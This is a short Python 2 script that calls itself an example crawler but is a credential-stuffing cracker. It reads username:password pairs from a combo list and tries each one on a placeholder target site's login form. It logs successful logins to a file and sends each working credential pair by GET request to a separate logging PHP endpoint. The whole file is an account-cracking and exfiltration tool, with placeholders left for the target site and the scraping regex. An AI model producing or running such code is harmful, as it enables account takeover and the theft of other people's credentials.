#! usr/bin/env python
#! -*- coding : utf-8 -*-


#This is ONLY EXAMPLE Crawler Program

import mechanize
import re
import urllib

b1 = open("combo.txt")
b2 = b1.readlines()

for i in b2:
	b3 = i.strip().split(":")
	user = b3[0]
	pw = b3[1]
	browser = mechanize.Browser()
	browser.open("Crack This Site") #Write a Please Your Cracking Site
	browser.select_form(nr = 0)
	browser.form["user[login]"] = user
	browser.form["user[pass]"] = pw
	browser.submit()

	a =  browser.response().read()

	if "/user/logout" in browser.response().read():
		print "cracked"
		b = re.search('REGEX SETTTİNGS',a)
		if b:
			d = b.group().replace("</u>","").replace('REGEX SETTTİNGS',"REGEX SETTTİNGS").replace("</div>","")
			print d
			kaydet = open("cracked.txt","a+")
			yazdir = b3[0] + ":" + b3[1] + ">>>>>" + d + "\n"
			c = kaydet.writelines(yazdir)
			sit = urllib.urlopen("/ex.php?e=%s&p=%s" %(b3[0],b3[1])) #This is LOG site PHP GET SETTING
	else:
		print "Wrong Password"
